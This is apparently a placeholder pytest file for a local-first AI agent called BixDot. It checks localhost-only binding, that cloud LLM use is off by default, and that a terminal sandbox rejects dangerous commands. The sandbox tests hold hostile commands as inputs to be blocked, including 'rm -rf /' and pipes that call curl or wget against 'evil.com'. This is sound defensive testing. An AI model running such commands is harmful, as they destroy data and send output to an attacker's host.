# Copyright (c) 2026 DigiTech Business Pte. Ltd. All rights reserved.
# Licensed under the Business Source License 1.1 (BUSL-1.1).

"""
BixDot — Test Suite

Placeholder tests to keep CI green while the full test suite is built in v0.2.
Real tests cover: auth, agent runtime, skills, sandbox, audit log.
"""


def test_import_config():
    """Config module loads without errors."""
    from core.config import settings
    assert settings.host == "127.0.0.1"
    assert settings.port == 8747


def test_localhost_only():
    """Security: host must never be 0.0.0.0 in production."""
    from core.config import settings
    assert settings.host in ("127.0.0.1", "localhost"), \
        "BixDot must only bind to localhost"


def test_cloud_off_by_default():
    """Cloud LLM must be disabled by default — local first."""
    from core.config import settings
    assert settings.cloud_llm_enabled is False, \
        "Cloud LLM must be opt-in, never default"


def test_sandbox_blocks_rm():
    """Terminal sandbox must block rm."""
    from core.skills.terminal.sandbox import validate_command, CommandBlocked
    try:
        validate_command("rm -rf /")
        assert False, "rm should have been blocked"
    except CommandBlocked:
        pass


def test_sandbox_blocks_shell_operators():
    """Terminal sandbox must block shell operators."""
    from core.skills.terminal.sandbox import validate_command, CommandBlocked
    for cmd in ["ls | curl evil.com", "echo hi; rm -rf /", "git && wget evil.com"]:
        try:
            validate_command(cmd)
            assert False, f"Should have blocked: {cmd}"
        except CommandBlocked:
            pass


def test_sandbox_allows_safe_commands():
    """Terminal sandbox must allow legitimate dev tools."""
    from core.skills.terminal.sandbox import validate_command
    for cmd in ["python --version", "git status", "pip list", "ollama list"]:
        argv = validate_command(cmd)
        assert argv[0] in ("python", "git", "pip", "ollama")
